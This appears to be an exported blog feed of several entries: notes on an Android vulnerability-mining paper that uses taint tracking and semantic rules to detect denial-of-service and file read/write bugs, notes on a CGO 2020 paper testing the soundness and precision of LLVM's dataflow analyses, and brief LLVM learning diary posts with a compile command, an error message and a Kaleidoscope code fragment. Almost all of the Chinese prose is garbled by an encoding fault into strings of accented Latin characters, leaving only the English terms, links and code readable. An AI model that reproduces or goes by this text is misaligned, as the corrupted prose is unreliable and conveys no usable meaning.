<del>ï¼ˆæ²’ç”¨éï¼Œmark ä¸€ä¸‹ï¼‰</del>ã€‚</p>
<h3 id="Rules-Description"><a href="#Rules-Description" class="headerlink" title="Rules Description"></a>Rules Description</h3><p>ä½œè€…æŠ½è±¡å‡ºäº†å¤§éƒ¨åˆ†å®‰å“æ‡‰ç”¨çš„æ¼æ´ç‰¹å¾µã€‚</p>
<ul>
<li>å­˜åœ¨ source function åˆ° sink function çš„èª¿ç”¨éˆ</li>
<li>æ”»æ“Šè€…èƒ½æ§åˆ¶ source function çš„è¼¸å…¥</li>
<li>åœ¨èª¿ç”¨éˆä¸­å­˜åœ¨ä¸ç•¶çš„æˆ–è€…ä¸å®Œæ•´çš„ parameter filters</li>
</ul>
<p>å°æ–¼ç¬¬ä¸€é»å’Œç¬¬äºŒé»ï¼Œä½œè€…æ¸…æ¥šçš„å®šç¾©äº†åˆ†æè·¯å¾‘çš„ endpoints å’Œè·¯å¾‘ä¸Šéœ€è¦æ»¿è¶³çš„æ¢ä»¶ï¼Œæ¯”å¦‚å‡½æ•¸åï¼Œèƒ½æ¥å—çš„ intents ä»¥åŠæ˜¯å¦å°å…¶ä»–çš„ app é–‹æ”¾ã€‚å°æ–¼ç¬¬ä¸‰å€‹ç‰¹å¾µï¼Œä½œè€…æè¿°äº†æ•¸æ“šæµä¿¡æ¯å’Œæ¨¡å¼ä¿¡æ¯ã€‚data-flow information ç”¨ä¾†æ±ºå®šè¼¸å…¥æ˜¯å¦èƒ½å½±éŸ¿ end functionï¼Œè€Œ pattern information ç”¨ä¾†æ±ºå®šæ˜¯å¦èª¿ç”¨éˆèƒ½å¦æ»¿è¶³ç›¸æ‡‰çš„æ¢ä»¶ã€‚</p>
<h2 id="PRELIMINARY-EXPERIMENT"><a href="#PRELIMINARY-EXPERIMENT" class="headerlink" title="PRELIMINARY EXPERIMENT"></a>PRELIMINARY EXPERIMENT</h2><p>ä½œè€…å®šç¾©äº†å¹¾å€‹æ¼æ´è¦å‰‡ï¼ŒåŒ…æ‹¬hard coded secret keyï¼Œarbitrary file read&#x2F;write&#x2F;delete&#x2F;reproduceï¼Œgeneric DoSï¼Œunsafe URL loadã€‚å¾Œæ–‡ä»‹ç´¹äº†ä»–å€‘çš„å…©ç¨®è¦å‰‡<del>(ä¸»è¦æ˜¯æ²’æœ‰æºç¢¼ï¼Œé€™è¦å‰‡å°±å¾ˆé›£æƒ³è±¡)</del></p>
<h3 id="Generic-DoS"><a href="#Generic-DoS" class="headerlink" title="Generic DoS"></a>Generic DoS</h3><p>å®šç¾©äº† endpoint æ˜¯ getExtras å‡½æ•¸ï¼Œå¹¶ä¸”ç”¨èªç¾©è¦å‰‡æè¿°äº†ä¸èƒ½è¢« tryâ€¦catch åŒ…è£¹ã€‚</p>
<p>é€™æ˜¯ä»–å€‘å®šç¾©çš„è¦å‰‡ </p>
<pre class="line-numbers language-none"><code class="language-none">(a) customized rules
1 semi-public components ^onCreate$
2 arbitrary components Landroid&#x2F;content&#x2F;Intent; -&gt;getExtras()Landroid&#x2F;os&#x2F;Bundle; 
3 semantic matching on 
4 semantic rules file rules.txt 
5 taint tracking off 
6 1 getIntent 

(b) rules.txt
NOT: | $TYPE $START(...) &#123;
	... 
	try &#123; 
		... 
		$END(...); 
		... 
	&#125; catch (...) &#123; 
		... 
	&#125; 
	... 
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä½œè€…ç™¼ç¾äº†70å¤šå€‹ Dos çš„0dayï¼Œé‚„æ˜¯è »æœ‰åƒ¹å€¼çš„ã€‚</p>
<h3 id="Arbitrary-File-Read-x2F-Write"><a href="#Arbitrary-File-Read-x2F-Write" class="headerlink" title="Arbitrary File Read&#x2F;Write"></a>Arbitrary File Read&#x2F;Write</h3><p>endpoint ç‚º setResult å‡½æ•¸ã€‚é€™å€‹å‡½æ•¸å¯ä»¥å‚³å›å¸¶æœ‰ flag çš„ intentï¼Œå¯èƒ½å­˜åœ¨ä»»æ„æ–‡ä»¶è®€å¯«çš„æ¼æ´ã€‚</p>
<p>å’Œå‰›æ‰çš„è¦å‰‡éå¸¸ç›¸ä¼¼ï¼Œå°±ä¸ Ctrl CV äº†ã€‚</p>
<p>å› çˆ²æƒ¡æ„ç¨‹åºéœ€è¦èƒ½å¤ æ§åˆ¶ intent çš„ data å’Œ flag éƒ¨åˆ†ï¼Œæ­¤è™•çš„èªç¾©è¦å‰‡éœ€è¦æ‰¾åˆ°æ‰€æœ‰èƒ½å° intent çš„ data å’Œ flag æœ‰ä¸€äº›çš„ç³»çµ±å‡½æ•¸ã€‚<del>(é€™è£æœ‰ä¸€äº›ä¸çŸ¥æ‰€äº‘ï¼Œå¯èƒ½å®‰å“çš„æ´ç­è§£çš„æ¯”è¼ƒå°‘)</del></p>
<p>æœ€å¾Œä½œè€…æ‰¾åˆ°äº† 6 ä¸ªä»»æ„æ–‡ä»¶è®€å¯«çš„æ¼æ´ï¼Œ</p>
<h2 id="CONCLUSION"><a href="#CONCLUSION" class="headerlink" title="CONCLUSION"></a>CONCLUSION</h2><p>ä½œè€…åŸºæ–¼<strong>æ±¡é»è¿½è¹¤</strong>å’Œ<strong>èªç¾©åˆ†æ</strong>å®ç°äº†<strong>è‡ªå®šç¾©è¦å‰‡</strong>çš„æ¼æ´æŒ–æ˜</p>
<p>ä½œè€…æ²’æœ‰é–‹æºä»£ç¢¼ï¼Œå¹¶ä¸”åªæœ‰å¯¥å¯¥3é  <del>å€’æ˜¯éå¸¸ç¯€çœé–²è®€è«–æ–‡çš„æ™‚é–“</del></p>
<h1 id="PS"><a href="#PS" class="headerlink" title="PS"></a>PS</h1><p>é‚„æœ‰å¾ˆå¤šç´°ç¯€ï¼Œç›¸é—œçš„è«–æ–‡å’Œå·¥å…·ï¼Œå¯ä»¥æ·±å…¥ç­è§£ã€‚</p>
]]></content>
      <categories>
        <category>Notes</category>
        <category>Paper</category>
      </categories>
      <tags>
        <tag>paper</tag>
        <tag>Notes</tag>
        <tag>Static Analysis</tag>
        <tag>vulnerability mining</tag>
      </tags>
  </entry>
  <entry>
    <title>è®ºæ–‡é˜…è¯»ç¬”è®°</title>
    <url>/2023/09/28/%E6%95%A3%E8%A8%98-9-28-23/</url>
    <content><![CDATA[<h1 id="è«–æ–‡é–²è®€"><a href="#è«–æ–‡é–²è®€" class="headerlink" title="è«–æ–‡é–²è®€"></a>è«–æ–‡é–²è®€</h1><blockquote>
<p><em>Jubi Taneja, Zhengyang Liu, and John Regehr. 2020. Testing static analyses for precision and soundness. In Proceedings of the 18th ACM&#x2F;IEEE International Symposium on Code Generation and Optimization (CGO 2020). Association for Computing Machinery, New York, NY, USA, 81â€“93. <a href="https://doi.org/10.1145/3368826.3377927">https://doi.org/10.1145/3368826.3377927</a></em></p>
</blockquote>
<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>ä½œè€…çš„ç›®çš„æ˜¯é–‹ç™¼ formal-method-basedï¼ˆåŸºæ–¼å½¢å¼åŒ–çš„ï¼‰ ç®—æ³•ï¼Œéœæ…‹åˆ†æä¸­çš„ imprecisions å’Œ unsoundnesses ã€‚</p>
<p>ä½œè€…çš„è²¢ç»æ˜¯è¨­è¨ˆä¸¦è©•ä¼°äº†æ•¸ç¨®ç®—æ³•ä¾†åˆ†æç·¨è­¯å™¨éœæ…‹åˆ†æçµæœçš„ soundnesses å’Œ precisionsï¼Œä»–å€‘åœ¨ LLVM ä¸¦ä¸Šæ²’æœ‰æ‰¾åˆ°æ–° soundness bugs ï¼Œä½†æ˜¯å¯ä»¥ç™¼ç¾ä»¥å‰ä¿®å¾©çš„ soundness bugã€‚ ä»–å€‘åœ¨ LLVM ä¸­ç™¼ç¾äº†æ¯”è¼ƒå¤šçš„ imprecisions å•é¡Œï¼Œå¹¶ä¸”éƒ¨åˆ†è¢«ä¿®å¾©äº†ã€‚ä¸»è¦çš„åˆ†æç›®æ¨™æ˜¯ LLVM çš„é‡è¦æ•¸æ“šæµåˆ†æ <code>Known bits</code> , <code>Demanded bit</code>, <code>Integer ranges</code>, ä»¥åŠä¸€äº›å‰å‘åˆ†æå¸ƒçˆ¾å€¼çš„ sound èˆ‡ preciseã€‚</p>
<p>å·¥ä½œå†…å®¹ä¸Šï¼Œä½œè€…é€šéè‡ªå·±çš„ç®—æ³•è¨ˆç®—ä»£ç¢¼ç‰‡æ®µçš„ sound and maximally precise ï¼Œèˆ‡ LLVM è‡ªå·±ç”¢ç”Ÿçš„æ•¸æ“šæµä¿¡æ¯ç›¸æ¯”è¼ƒã€‚ç•¶ LLVM æ¯”è‡ªå·±çš„ more precise æ™‚ï¼Œå¯èƒ½ LLVM çš„ soundnesses å°±æœƒå­˜åœ¨å•é¡Œã€‚ç•¶ LLVM æ¯”è‡ªå·± less precise æ™‚ï¼Œä»–å€‘çš„ precision å¯èƒ½å°±æœƒæœ‰å•é¡Œã€‚<del>ï¼ˆæœ‰é»å¥‡æ€ªï¼‰</del></p>
<h2 id="Backround"><a href="#Backround" class="headerlink" title="Backround"></a>Backround</h2><p>ä½œè€…çš„ç ”ç©¶åŸºæ–¼ Souper: A Synthesizing Superoptimizer</p>
<h3 id="Dataflow-Analysis"><a href="#Dataflow-Analysis" class="headerlink" title="Dataflow Analysis"></a>Dataflow Analysis</h3><p>æ•¸æ“šæµåˆ†æç”¨æ–¼è¨ˆç®—ç¨‹åºåŸ·è¡Œéç¨‹ä¸­çš„æ­£ç¢ºæ€§ã€‚æ•¸æ“šæµåˆ†ææ‡‰è©²æ˜¯ sound ï¼Œä½†æ˜¯å®ƒä¹Ÿå…è¨± imprecisionï¼Œå³å…è¨± false positiveã€‚</p>
<h3 id="Static-Analysis-in-LLVM"><a href="#Static-Analysis-in-LLVM" class="headerlink" title="Static Analysis in LLVM"></a>Static Analysis in LLVM</h3><p>LLVM å°æ–¼ éœæ…‹åˆ†ææ˜¯ä¸€å€‹éå¸¸å¥½çš„åŸºçŸ³ï¼Œé«˜ç´šèªè¨€çš„ tricky å’Œ implicit çš„ä¸€äº›ç‰¹æ€§æ¯”å¦‚é¡å‹è½‰æ›ï¼Œè¡¨é”å¼çš„é †åºç­‰åœ¨ LLVM IR ä¸­å°±ä¸æœƒå‡ºç¾é€™ç¨®å¦¨ç¤™åˆ†æçš„ç‰¹æ€§ã€‚å®ƒçš„ SSA ä½¿å¾—å°å‡½æ•¸çš„æ•¸æ“šæµåˆ†æè®Šå¾—é«˜æ•ˆä¸”ç°¡å–®ã€‚ç”±æ–¼ LLVM ä¸­å·²ç¶“å¯¦ç¾äº†éå¸¸å¤šçš„å„ªåŒ–å™¨ï¼Œæ¯”å¦‚ dead code optimizationï¼Œæ¸›å°‘äº†å·¥ä½œçš„ä¸€äº›å°é˜»ç¤™ã€‚<del>ç•¢ç«Ÿæ˜¯çˆ²äº†åˆ†æ soundnesses èˆ‡ precisionsï¼Œæœ€å¾Œé‚„è¦çœ‹çœ‹æœ‰æ²’æœ‰æå‡å„ªåŒ–å™¨èƒ½åŠ›</del>ã€‚</p>
<h4 id="Known-Bits"><a href="#Known-Bits" class="headerlink" title="Known Bits"></a>Known Bits</h4><p>ç”¨æ–¼åˆ¤æ–·åŸ·è¡Œéç¨‹ä¸­ bit æ˜¯ 0 æˆ– 1ï¼Œä½¿å¾—ç®—æ•¸é‹ç®—ä¸­å¯ä»¥è¡¨ç¾çš„æ›´é«˜æ•ˆã€‚</p>
<h4 id="Number-of-Sign-Bits"><a href="#Number-of-Sign-Bits" class="headerlink" title="Number of Sign Bits"></a>Number of Sign Bits</h4><p>ç¬¦è™Ÿä½çš„é«˜ä½ï¼Œå¯èƒ½æœƒæœ‰å’Œç¬¦è™Ÿä½ç›¸åŒçš„å€¼ï¼Œå¯ä»¥ç”¨ä¾†ç¯€ç´„ç©ºé–“ã€‚</p>
<p>ç”±æ–¼ Number of Sign Bits çš„åˆ†ææº–å‰‡å’Œ Known Bits åˆ†æå‡†æ¸¬æ¯”è¼ƒç›¸ä¼¼ï¼Œæ‰€ä»¥ä½œè€…å¿½ç•¥äº†é€™ä¸€éƒ¨åˆ†ã€‚</p>
<p><del>ä¸å¤ªæ‡‚é€™æ˜¯æ€éº½å„ªåŒ–çš„</del></p>
<h4 id="Single-bit-Analyses"><a href="#Single-bit-Analyses" class="headerlink" title="Single-bit Analyses"></a>Single-bit Analyses</h4><p>åˆ¤æ–·å€¼é0ï¼Œè² ï¼Œéè² ï¼Œ2å†ªã€‚åŒ Number of Sign Bitsã€‚</p>
<p>å¦‚æœè¼¸å…¥è¦éº½æ˜¯ 0 æˆ– 1ï¼Œè¼¸å‡ºå°æ‡‰äº† 0 æˆ– 1ã€‚é‚£éº½é€™å€‹åˆ†æå°±æ˜¯ soundã€‚å¦‚æœè¼¸å‡ºç‚º 0 æˆ–1 å°æ‡‰äº†è¼¸å…¥ç‚º 0 æˆ– 1ï¼Œå‰‡åˆ†ææ˜¯ maximally preciseã€‚</p>
<h4 id="Integer-Range-Analysis"><a href="#Integer-Range-Analysis" class="headerlink" title="Integer Range Analysis"></a>Integer Range Analysis</h4><p>å„ªåŒ– <code>away comparisons</code> ï¼Œæ¯”å¦‚ [0, 100) &lt; [200, 205) å¯ä»¥è¢«ç°¡åŒ–çˆ² trueã€‚LLVM çš„ Correlated Value Propagation pass å°±æ˜¯ä»¥é€™ç¨®æ–¹å¼å„ªåŒ–ç¨‹åºçš„å„ªåŒ–å™¨ã€‚</p>
<p>Lazy Value Infoï¼ˆLVIï¼‰æ˜¯ LLVM çš„ç¶“å…¸çš„ integer range analysisã€‚LVI ä¸­çš„ constant range æœ‰å››ç¨®å½¢å¼ï¼š</p>
<ul>
<li>Empty set: ç©ºçš„ concretization set </li>
<li>Full set: åŒ…å«æ‰€æœ‰æ•´å½¢çš„ concretization set</li>
<li>Regular range [a, b) with a &lt;u b: åŒ…å«æ‰€æœ‰å¤§æ–¼ç­‰æ–¼ a ä¸”å°æ–¼ b çš„ concretization set</li>
<li>Wrapped range [a, b) with a &gt;u b: åŒ…å«æ‰€ä»¥è¦éº½å¤§æ–¼ç­‰æ–¼a è¦éº½å°æ–¼ b çš„ concretization set</li>
</ul>
<p>a&#x3D;b&#x3D;0 å’Œ a&#x3D;b&#x3D;UNIT_MAX è¡¨ç¤ºempty å’Œ full setsã€‚</p>
<p><del>ï¼ˆé€™è£æ€æ¨£æ˜¯ sound æ€æ¨£æ˜¯ precise çœ‹ä¸æ‡‚ï¼Œä»¥å¾Œå†è£œå……ï¼‰</del></p>
<h4 id="Demanded-Bits"><a href="#Demanded-Bits" class="headerlink" title="Demanded Bits"></a>Demanded Bits</h4><p>èˆ‡å‰é¢çš„åˆ†æä¸åŒï¼Œdemanded bits æ˜¯ backword program analysisï¼Œå°‹æ‰¾é‚£äº›æ²’ç”¨çš„ bitsï¼Œæ¯”å¦‚èª¬æŸå€‹ 32bit æ•´æ•¸è¢«è£å‰ªç‚º 8bit çš„è­‰æ›¸ï¼Œé‚£éº½å‰é¢ 24bits å°±æœƒè¢« demanded bits æ¨™è¨˜ç‚º not demandedã€‚</p>
<p>å¦‚æœ not demanded bits è¢«ä»»æ„è¨­ç½®ç‚º 0 æˆ– 1 è€Œä¸å½±éŸ¿çµæœï¼Œé‚£éº½é€™å€‹åˆ†æå°±æ˜¯ soundã€‚</p>
<p><img src="https://i.imgs.ovh/2023/10/10/LyInj.png" alt="image-20231004194744221"></p>
<p>å¦‚æœ demanded bits è¢«ä»»æ„è¨­ç½®ç‚º 0 æˆ– 1ï¼Œå°è‡´äº†çµæœçš„æ”¹è®Šï¼Œé‚£éº½é€™å€‹åˆ†æå°±æ˜¯ maximally preciseã€‚</p>
<p><img src="https://i.imgs.ovh/2023/10/10/LyhoI.png" alt="image-20231004195529414"></p>
<p>å¦‚æœåˆ†æå®Œç™¼ç¾å…¨éƒ½æ˜¯ not demanded bitsï¼Œé‚£éº½ f å°±å¯ä»¥ç›´æ¥è¢«ç§»é™¤äº†ã€‚<del>ä¼¼ä¹é€™ç¨®æ€æƒ³å¯ä»¥ç”¨åœ¨ dç®—æ•¸æ··æ·†ä¸­</del>ã€‚å¦‚æœåªæ˜¯éƒ¨åˆ† not demanded bits ï¼Œå¯èƒ½æˆ‘å€‘å¯ä»¥ç”¨æ›´ç°¡å–®çš„è¡¨é”å¼å»è¡¨ç¤ºã€‚<del>çœ‹ä¸Šå»æ˜¯ä¸€ç¨®éå¸¸å¥½ç”¨çš„å„ªåŒ–å™¨ã€‚</del></p>
<h3 id="Reasoning-about-LLVM-using-Souper"><a href="#Reasoning-about-LLVM-using-Souper" class="headerlink" title="Reasoning about LLVM using Souper"></a>Reasoning about LLVM using Souper</h3><p>Souper æ˜¯ä¸€å€‹é–‹æºçš„ â€œsuper optimizerâ€ï¼Œé‹è¡Œåœ¨ LLVM middle-end optimization passï¼ŒæŠŠ LLVM IR è½‰æ›çˆ²å®ƒè‡ªå·±çš„ IRï¼Œå¹¶å°‡ç™¼ç¾çš„å„ªåŒ–æ‡‰ç”¨æ–¼æ­£åœ¨ç·¨è­¯éç¨‹ä¸­çš„å„ªåŒ–å™¨ã€‚<del>æ€éº½ä¸€è‚¡ JIT çš„å‘³é“</del></p>
<p>ä½œè€…é‡ç”¨äº† Souper éƒ¨åˆ†è¨ˆç®— precise çš„ dataflow factsï¼Œå› çˆ²ä»–å€‘ä¹Ÿè¦æŠŠ LLVM IR è½‰æ›çˆ²ç”¨æ–¼ SMT solvers æŸ¥è©¢çš„ IRã€‚ä¹‹å¾Œç”¨æ–¼åˆ†æçš„æ¯ä¸€éƒ¨åˆ†ä»£ç¢¼ç‰‡æ®µè¢«ç¨±ä¹‹çˆ² â€œSouper expressionâ€ï¼Œè¡¨ç¤ºäº† LLVM instructions çš„ä¸€å€‹æœ‰å‘ç„¡ç’°åœ–ã€‚</p>
<p>ä½†æ˜¯ Souper ä¹Ÿæœ‰ä¸€äº›ç¼ºé™·ï¼Œå®ƒç„¡æ³•çœ‹åˆ°å†…å­˜å¼•ç”¨ï¼Œå‡½æ•¸èª¿ç”¨ï¼Œå¾ªç’°è¿­ä»£ç­‰ã€‚</p>
<p>Souper åœ¨ä½œè€…çš„å·¥ä½œä¸­å¤§éƒ¨åˆ†éƒ½æ²’æœ‰ç”¨åˆ°ã€‚åœ¨ integer range è¨ˆç®—ä¸­å­˜åœ¨ä¸€äº›ç‰¹æ®Šæƒ…æ³ï¼Œå¾Œæ–‡æœƒè¬›åˆ°ã€‚</p>
<h2 id="Testing-Dataflow-Analyses-for-Soundness-and-Precision"><a href="#Testing-Dataflow-Analyses-for-Soundness-and-Precision" class="headerlink" title="Testing Dataflow Analyses for Soundness and Precision"></a>Testing Dataflow Analyses for Soundness and Precision</h2><p>é€™ä¸€ç¯€è¬›äº†ä½œè€…çš„å·¥ä½œï¼Œéœ€è¦å°‡è§£æ±ºä¸€äº› sub-problems</p>
<ul>
<li>ç”¨å…¸å‹çš„ LLVM IR å»æ¸¬è©¦ç·¨è­¯å™¨çš„ dataflow analyses</li>
<li>ä¿è­‰ LLVM å’Œä½œè€…çš„ç®—æ³•åˆ†æçš„æ˜¯åŒæ¨£çš„ä»£ç¢¼ï¼Œä¹Ÿå°±æ˜¯ä¹‹å‰æåˆ°çš„ peace of codeï¼Œé€™æ¨£æ–¹ä¾¿æ¯”è¼ƒ</li>
<li>ç”¨ SMT è¨ˆç®— precise dataflow çµæœã€‚</li>
</ul>
<h4 id="Finding-Test-Inputs"><a href="#Finding-Test-Inputs" class="headerlink" title="Finding Test Inputs"></a>Finding Test Inputs</h4><p>ä½œè€…ä½¿ç”¨ SPEC CPU 2017 ä¸­çš„ C C++ benchmarksï¼Œé—œé–‰ Souper çš„ syntjesosï¼Œæœ€å¾Œä»–å€‘ç”¢ç”Ÿäº† 269113 çš„ Souper expressionsï¼Œ71.6% é‡è¤‡ä¸æ­¢ä¸€æ¬¡ï¼Œ 11.4% é‡è¤‡è¶…é 10æ¬¡ï¼Œ1.6% è¶…é 100æ¬¡ã€‚<del>ï¼ˆé€™æœ‰ä»€éº½æ„ç¾©å—ï¼Œæ„Ÿè¦ºå’Œæ–‡ç« æƒ³åšçš„äº‹æƒ…æ²’ä»€éº½é—œä¿‚ï¼Œå¾Œé¢å†çœ‹çœ‹ï¼‰</del></p>
<h4 id="Enabling-Comparable-Reslts"><a href="#Enabling-Comparable-Reslts" class="headerlink" title="Enabling Comparable Reslts"></a>Enabling Comparable Reslts</h4><p>ä»–å€‘ä¸èƒ½è¼•æ˜“çš„ç²å¾— precise dataflow resultsï¼Œä¹Ÿå°±å¾ˆé›£é€²è¡Œæ¯”è¼ƒï¼Œæ¯”å¦‚ LLVM integer analysis å­˜åœ¨éç¨‹é–’çš„åˆ†æï¼Œè€Œä»–å€‘è™•ç†ä¸äº†ã€‚ä½œè€…çš„æ€è·¯æ˜¯å†æŠŠ Souper IR è½‰æ›æˆ LLVM IR é€²è¡Œæ¯”è¼ƒã€‚<del>å¯¦åœ¨é›£ä»¥ç†è§£ï¼Œçˆ²ä»€éº½æœƒåˆ†æä¸äº†ï¼Œå› çˆ² Souper æœ¬èº«å°±ä¸æ”¯æŒéç¨‹é–’åˆ†æå—ï¼Œæœ€å¾Œå±…ç„¶è¦å†è½‰æ›æˆ LLVM IR ä¾†æ¯”è¼ƒäºŒè€…çš„ç²¾åº¦</del></p>
<h4 id="Algorithms-for-Maximally-Precise-Dataflow-Analyses"><a href="#Algorithms-for-Maximally-Precise-Dataflow-Analyses" class="headerlink" title="Algorithms for Maximally Precise Dataflow Analyses"></a>Algorithms for Maximally Precise Dataflow Analyses</h4><p><del>åƒå…¶ä»–çš„ synthesis problem ä¸€æ¨£ï¼Œç”¨ SMT solver è¨ˆç®— precise æ•¸æ“šæµçµæœæ˜¯ä¸€å€‹ search problemï¼Œä»–ä½¿ç”¨äº†å¤šç¨®æ±‚è§£ä»¥é”åˆ°ä¸€å€‹æœ€å„ªè§£ï¼Œä½œè€…çš„ç®—æ³•é€šéåˆ©ç”¨ abstract domainsï¼Œå˜—è©¦æ‰€æœ‰çš„å¯èƒ½ï¼Œå¾æœ€å‡†ç¢ºçš„çµæœï¼ˆn sign bitsï¼‰é–‹å§‹ã€‚</del></p>
]]></content>
      <categories>
        <category>Notes</category>
        <category>Paper</category>
      </categories>
      <tags>
        <tag>paper</tag>
        <tag>Notes</tag>
        <tag>LLVM</tag>
      </tags>
  </entry>
  <entry>
    <title>LLVM æ‘¸é±¼ç¬”è®°</title>
    <url>/2023/09/27/%E6%95%A3%E8%A8%98-9-27-23/</url>
    <content><![CDATA[<h1 id="LLVM-å­¸ç¿’"><a href="#LLVM-å­¸ç¿’" class="headerlink" title="LLVM å­¸ç¿’"></a>LLVM å­¸ç¿’</h1><blockquote>
<p>There are multiple reasons why pieces of GCC cannot be reused as libraries, including rampant use of global variables, weakly enforced invariants, poorly-designed data structures, sprawling code base, and the use of macros that prevent the codebase from being compiled to support more than one front-end&#x2F;target pair at a time. The hardest problems to fix, though, are the inherent architectural problems that stem from its early design and age. Specifically, GCC suffers from layering problems and leaky abstractions: the back end walks front-end ASTs to generate debug info, the front ends generate back-end data structures, and the entire compiler depends on global data structures set up by the command line interface.</p>
</blockquote>
<p>é—œæ–¼ GCC å’Œ LLVM çš„ä¸€å€‹å°æ¯”ï¼Œèƒ½æ›´åŠ ç›´è§€çš„ç­è§£åˆ° LLVM çš„å„ªå‹¢ã€‚GCC ç”±æ–¼å…¶èª•ç”Ÿçš„æ¯”è¼ƒæ—©ï¼Œå°æ–¼ç·¨è­¯å™¨çš„åˆ†å±¤å’ŒæŠ½è±¡åšçš„ä¸å¤ªå¥½ï¼Œä½¿å¾—å¾Œç«¯ä»£ç¢¼ç”Ÿæˆèª¿è©¦ä¿¡æ¯éœ€è¦è·‘ä¸€é‚Šå‰ç«¯ç”Ÿæˆçš„ASTã€‚å…¨å±€çš„æ•¸æ“šçµæ§‹ï¼Œæ¿«ç”¨çš„å®ç­‰ç­‰å°è‡´ GCC ä»£ç¢¼å¾ˆé›£é‡ç”¨ã€‚</p>
<p><a href="https://aosabook.org/en/v1/llvm.html">https://aosabook.org/en/v1/llvm.html</a></p>
]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>Notes</tag>
        <tag>LLVM</tag>
      </tags>
  </entry>
  <entry>
    <title>LLVM æ‘¸é±¼ç¬”è®°</title>
    <url>/2023/09/26/%E6%95%A3%E8%A8%98-9-26-23/</url>
    <content><![CDATA[<h1 id="LLVM-å­¸ç¿’"><a href="#LLVM-å­¸ç¿’" class="headerlink" title="LLVM å­¸ç¿’"></a>LLVM å­¸ç¿’</h1><p>æ˜¨å¤©å¤ªç´¯ï¼Œä»Šå¤©ç¹¼çºŒä¼‘æ¯ã€‚ä½†æ˜¯ LLVM åœ¨ç·¨è­¯äº†ã€‚</p>
<p>è©²è£œèª²äº†ï¼Œç™¼ç¾è‡ªå·±ç·¨è­¯çš„ LLVM å°‘äº†ä¸€äº›é ­æ–‡ä»¶ï¼Œå¯èƒ½æ˜¯ç·¨è­¯é¸é …æ²’é…ç½®å¥½çš„åŸå› ï¼Œé€™æ¬¡åŠ ä¸Š <code>-DLLVM_ENABLE_PROJECTS=all</code> å¸Œæœ›èƒ½æ­£å¸¸ã€‚</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">clang++ -I /home/rt/llvm-project/llvm/include/ -g -O3 Keleidoscope.cpp <span class="token variable"><span class="token variable">$(</span>llvm-config --cxxflags --ldflags --system-libs --libs core<span class="token variable">)</span></span> -o mytest.o<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">&#x2F;home&#x2F;rt&#x2F;llvm-project&#x2F;llvm&#x2F;include&#x2F;llvm&#x2F;Support&#x2F;Compiler.h:18:10: fatal error: &#39;llvm&#x2F;Config&#x2F;llvm-config.h&#39; file not found
   18 | #include &quot;llvm&#x2F;Config&#x2F;llvm-config.h&quot;
      |          ^~~~~~~~~~~~~~~~~~~~~~~~~~~
1 error generated.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>æœ‰ä¸€é»é›£ç”¢äº†ï¼Œç›®éŒ„ä¸­çš„ llvm-config.h è¢«æ›æˆäº† llvm-config.h.cmakeã€‚ä¸çŸ¥é“è©²æ€éº½è™•ç†ï¼Œå¦‚æœæ˜¯å› çˆ²ç‰ˆæœ¬ä¸å…¼å®¹ï¼Œæ‰“ç®—ç›´æ¥ <code>apt install llvm-dev-14</code> ç”¨ä»¥å‰çš„ç‰ˆæœ¬å¥½äº†ã€‚</p>
]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>Notes</tag>
        <tag>LLVM</tag>
      </tags>
  </entry>
  <entry>
    <title>LLVM æ‘¸é±¼ç¬”è®°</title>
    <url>/2023/09/25/%E6%95%A3%E8%A8%98-9-25-23/</url>
    <content><![CDATA[<h1 id="LLVM-å­¸ç¿’"><a href="#LLVM-å­¸ç¿’" class="headerlink" title="LLVM å­¸ç¿’"></a>LLVM å­¸ç¿’</h1><p>ä»Šå¤©åªç¨å¾®çœ‹äº†éƒ¨åˆ† LLVM IR JIT çš„é‚£ä¸€ç« ï¼Œæ‘¸äº†</p>
<p>ã€Šå¥§æœ¬æµ·é»˜ã€‹æœ‰é»å¥½çœ‹çš„ï¼Œä½†æ˜¯æˆ‘æ ¹æœ¬è¨˜ä¸ä½äººåï¼ŒéŒ¯éå¤ªå¤šå¿ƒç†æ´»å‹•ï¼Œå°è‡´äº†é›»å½±çš„éŒ¯ç¶œè¤‡é›œçš„æ„Ÿè¦ºã€‚æ·±å¤œæ™šä¸Šåˆè¢«æ‹‰å‡ºå»åƒäº†æµ·åº•æ’ˆã€‚</p>
<p>å•¥ä¹Ÿæ²’å­¸ï¼Œè² ç½ªæ„Ÿæ»¿æ»¿ã€‚</p>
]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>Notes</tag>
        <tag>LLVM</tag>
      </tags>
  </entry>
  <entry>
    <title>LLVM å­¸ç¿’ç¬”è®°</title>
    <url>/2023/09/24/%E6%95%A3%E8%A8%98-9-24-23/</url>
    <content><![CDATA[<h1 id="LLVM-å­¸ç¿’"><a href="#LLVM-å­¸ç¿’" class="headerlink" title="LLVM å­¸ç¿’"></a>LLVM å­¸ç¿’</h1><p>çµ‚æ–¼ä¾†åˆ°æ¿€å‹•äººå¿ƒçš„ç¬¬ä¸‰ç«  LLVM IRï¼ˆä»Šå¤©æ˜¯å‘¨æ—¥ï¼Œæœ‰é»æ“ºäº†</p>
<blockquote>
<pre class="line-numbers language-none"><code class="language-none">Function *PrototypeAST::codegen() &#123;
  &#x2F;&#x2F; Make the function type:  double(double,double) etc.
  std::vector&lt;Type*&gt; Doubles(Args.size(),
                             Type::getDoubleTy(*TheContext));
  FunctionType *FT &#x3D;
    FunctionType::get(Type::getDoubleTy(*TheContext), Doubles, false);

  Function *F &#x3D;
    Function::Create(FT, Function::ExternalLinkage, Name, TheModule.get());<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


